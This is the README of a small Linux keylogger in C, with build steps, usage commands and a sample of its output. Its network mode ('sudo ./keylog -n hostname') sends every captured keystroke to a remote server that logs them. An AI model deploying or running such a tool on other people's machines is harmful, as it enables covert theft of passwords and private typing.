# keylogger - Simple yet effective one

A simple keylogger for Linux written in C. The current version will attempt to detect your keyboard event file automatically. 

## Usage

### Client

#### File

```bash
cd keylog/
sudo ./keylog -f file-to-write-to.txt
```

This will log all keystrokes to the specified file while the program is running.

#### Network

```bash
cd keylog/
sudo ./keylog -n hostname
```

This will send all keystrokes to the server running on `hostname`.

### Server


#### stdout

```bash
cd keylog/
./server
```

This will write all keystrokes received from the client to stdout.

#### File

```bash
cd keylog/
./server -f file-to-write-to.txt
```

This will write all keystrokes received from the client to the specified file.

## Output Format

Each key press will cause a string representing that key to be written to the
chosen location, followed by a newline. When the program quits, an extra newline will be added.

#### Example

Typing `hello world` and then quitting the program with `Ctrl-C` will cause the chosen location to contain the following.

```
H
E
L
L
O
SPACE
W
O
R
L
D
LEFTCTRL
C
```

## Building

```bash
cd keylog/
make
```
